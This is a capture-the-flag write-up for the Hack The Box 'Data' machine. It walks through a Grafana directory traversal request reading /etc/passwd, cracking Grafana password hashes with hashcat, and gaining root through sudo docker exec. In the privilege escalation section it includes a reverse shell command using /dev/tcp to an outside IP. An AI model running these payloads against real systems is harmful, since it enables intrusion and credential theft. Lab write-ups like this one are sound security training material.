---
layout: writeup
name: "Data"
platform: "HackTheBox"
category: "retired"
difficulty: "Easy"
permalink: /writeups/retired/data/
os: "Hack The Box"
date: 2026-02-25
pwned: true
---
# 🧪 Hack The Box — Data

**Platform:** Hack The Box  
**Difficulty:** Easy  
**IP:** 10.129.238.160  
**Date Completed:** 2025-07-25

---

## 🧭 Overview

This box explores vulnerabilities in Grafana — including directory traversal, SQLite DB leaks, salted SHA-256 password hashes, and Docker container privilege escalation.

---

## 🔍 Enumeration

```bash
nmap -sC -sV 10.129.238.160
```

Ports found:
- `22/tcp`: OpenSSH
- `3000/tcp`: Grafana

Directory traversal on Grafana exposed system files:

```http
GET /public/plugins/welcome/../../../../../../../../../../../../../etc/passwd
```

Extracted `grafana.db` and dumped the `user` table via SQLite:

```sql
SELECT * FROM user;
```

Used [grafana2hashcat](https://github.com/iamaldi/grafana2hashcat) to convert salted hashes and cracked them with `hashcat -m 10900`.

---

## 💻 Foothold

Logged in as **boris** via SSH:

```bash
ssh boris@data.htb
```

Got `user.txt`:
```
105d3977d1672bd473f25178xxxxx
```

---

## ⚙️ Privilege Escalation

```bash
sudo -l
```

```bash
(root) NOPASSWD: /snap/bin/docker exec *
```

Used Docker `exec` to escape into the container:

```bash
sudo docker exec --interactive --privileged --user root <container_id> /bin/sh -i >& /dev/tcp/10.10.14.4/4444 0>&1
```

Or used [Penelope](https://github.com/brightio/penelope) to catch shell.

Got `root.txt`:
```
40fec1da153ae8450e86a4b33a9cxxxxx
```

---

## ✅ Summary

**User:** Extract Grafana DB → Hashcat crack → SSH as boris  
**Root:** Docker `exec` on privileged container → root shell  
